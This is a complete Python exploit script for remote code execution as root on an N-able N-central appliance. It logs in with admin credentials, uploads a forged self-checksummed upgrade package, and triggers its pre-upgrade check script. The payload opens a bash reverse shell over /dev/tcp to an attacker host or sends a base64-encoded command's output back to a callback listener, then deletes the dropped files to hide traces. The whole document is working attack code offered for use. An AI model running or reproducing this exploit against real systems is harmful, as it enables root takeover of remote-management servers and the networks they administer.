#!/usr/bin/env python3
import argparse
import base64
import getpass
import hashlib
import os
import secrets
import socket
import subprocess
import tarfile
import tempfile
import threading
from pathlib import Path

import requests
import urllib3


def main():
    p = argparse.ArgumentParser(description="N-central self-checksummed NSP root RCE")
    p.add_argument("--target", default="https://192.168.1.14:8443")
    p.add_argument("--username", default="productadmin@n-able.com")
    p.add_argument("--password", default=os.getenv("PRODUCTADMIN_PASSWORD"))
    p.add_argument("--command", default="/usr/bin/id")
    p.add_argument("--callback-host", required=True, help="address reachable from the appliance")
    p.add_argument("--listen-host", default="0.0.0.0")
    p.add_argument("--callback-port", type=int, default=9001)
    p.add_argument("--lhost")
    p.add_argument("--lport", type=int)
    a = p.parse_args()
    password = a.password or getpass.getpass("Password: ")
    reverse = bool(a.lhost or a.lport)
    if reverse and not (a.lhost and a.lport):
        p.error("--lhost and --lport must be supplied together")

    received = []
    listener = None
    if not reverse:
        listener = socket.socket()
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((a.listen_host, a.callback_port))
        listener.listen(1)

        def accept():
            conn, _ = listener.accept()
            with conn:
                received.append(conn.recv(65535).decode(errors="replace"))

        threading.Thread(target=accept, daemon=True).start()

    with tempfile.TemporaryDirectory() as td:
        root = Path(td)
        stem = "update_" + secrets.token_hex(5)
        upgrade = root / "inner" / "n-central-upgrade"
        upgrade.mkdir(parents=True)
        (upgrade / "upgrade.sh").write_text("#!/bin/bash\nexit 0\n")
        if reverse:
            payload = f"/bin/bash -c 'bash -i >& /dev/tcp/{a.lhost}/{a.lport} 0>&1'"
        else:
            encoded = base64.b64encode(a.command.encode()).decode()
            payload = (
                f"out=$(echo {encoded}|base64 -d|/bin/bash 2>&1);"
                f"exec 3<>/dev/tcp/{a.callback_host}/{a.callback_port};printf '%s\\n' \"$out\" >&3"
            )
        cleanup = (
            "trap 'rm -f /var/opt/n-central/tmp/n-central-upgrade/upgrade.sh "
            "/var/opt/n-central/tmp/n-central-upgrade/pre-upgrade-checks.sh "
            f"/var/opt/n-central/tmp/{stem}.sha2 /var/opt/n-central/tmp/{stem}.zstd "
            "/var/opt/n-central/tmp/n-central-upgrade.nsp; "
            "rmdir /var/opt/n-central/tmp/n-central-upgrade' EXIT\n"
        )
        (upgrade / "pre-upgrade-checks.sh").write_text("#!/bin/bash\n" + cleanup + payload + "\n")
        os.chmod(upgrade / "upgrade.sh", 0o755)
        os.chmod(upgrade / "pre-upgrade-checks.sh", 0o755)

        inner_tar = root / (stem + ".tar")
        compressed = root / (stem + ".zstd")
        digest_file = root / (stem + ".sha2")
        package = root / (stem + ".nsp")
        with tarfile.open(inner_tar, "w") as tar:
            tar.add(upgrade, arcname="n-central-upgrade")
        subprocess.run(["zstd", "-q", "-f", str(inner_tar), "-o", str(compressed)], check=True)
        digest_file.write_text(f"{hashlib.sha256(compressed.read_bytes()).hexdigest()}  {compressed.name}\n")
        with tarfile.open(package, "w") as tar:
            tar.add(digest_file, arcname=digest_file.name)
            tar.add(compressed, arcname=compressed.name)

        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        target = a.target.rstrip("/")
        s = requests.Session()
        s.verify = False
        s.get(target + "/login", timeout=30)
        login = s.post(
            target + "/loginLoginAction.action",
            data={"username": a.username, "password": password, "customerId": "1", "soName": ""},
            allow_redirects=False,
            timeout=30,
        )
        if login.status_code != 302:
            raise SystemExit(f"login={login.status_code}")
        s.get(target + "/IndexAction.action", timeout=30)
        upload = s.post(
            target + "/dms/rest/nac/version-management/uploadNsp",
            files={"file": (package.name, package.read_bytes(), "application/octet-stream")},
            timeout=180,
        )
        trigger = s.post(
            target + "/dms/rest/nac/version-management/preUpgradeChecksTrigger",
            timeout=180,
        )
        print(f"login={login.status_code}")
        print(f"upload={upload.status_code}")
        print(f"trigger={trigger.status_code}")
        if not reverse:
            for _ in range(120):
                if received:
                    break
                threading.Event().wait(0.25)
            if received:
                print(received[0].strip())
            listener.close()


if __name__ == "__main__":
    main()
